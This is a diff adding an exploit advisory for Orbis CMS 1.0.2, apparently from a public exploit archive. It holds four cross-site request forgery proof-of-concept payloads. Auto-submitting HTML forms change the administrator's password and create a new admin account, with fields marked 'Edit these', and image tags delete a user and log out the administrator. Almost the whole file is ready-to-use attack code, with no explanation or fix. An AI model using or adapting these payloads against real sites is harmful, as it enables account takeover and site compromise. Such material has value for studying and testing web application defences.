@@ -1,0 +1,57 @@
+<!---
+    Title: Orbis CMS 1.0.2 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 11 Jul 2010 08:08:10 PM EEST 
+    Vendor: http://www.novo-ws.com/orbis-cms/
+    Download: http://www.ohloh.net/p/orbis-cms/download?filename=orbis-1.0.2.zip
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Orbis CMS 1.0.2 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/admin_users_update.php" method="get">
+                <!--- Edit these --->
+                <input type="hidden" name="euserp" value="rootroot" />
+                <input type="hidden" name="eusere" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="eusern" value="1" />
+                <input type="hidden" name="eusert" value="2" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Orbis CMS 1.0.2 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/admin_users_create.php" method="get">
+                <!--- Edit these --->
+                <input type="hidden" name="nusern" value="root" />
+                <input type="hidden" name="nuserp" value="rootroot" />
+                <input type="hidden" name="nusere" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="nusert" value="2" />
+                <input type="hidden" name="Submit" value="Create user" />
+            </form>
+        </body>
+    </html>
+   
+-=[ CSRF PoC 3 - Delete User ]=-
+
+    <img src="http://[domain]/admin/admin_users_delete.php?id=2" alt="Do you see this?" />
+   
+-=[ CSRF PoC 4 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/login_end.php" alt="Do you see this?" />
+   
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
